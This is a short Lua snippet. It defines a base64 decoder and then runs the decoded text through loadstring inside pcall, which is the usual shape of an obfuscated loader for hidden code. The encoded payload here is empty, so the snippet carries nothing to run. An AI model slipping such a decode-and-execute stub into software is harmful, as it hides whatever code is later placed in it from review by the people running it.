local b="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" local function d(D) D=string.gsub(D,'[^'..b..'=]','') return (D:gsub('.',function(x) if x=='=' then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r end):gsub('%d%d%d%d%d%d%d%d',function(x) local r=0 for i=1,8 do r=r+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(r) end)) end pcall(function() loadstring(d(""))() end)
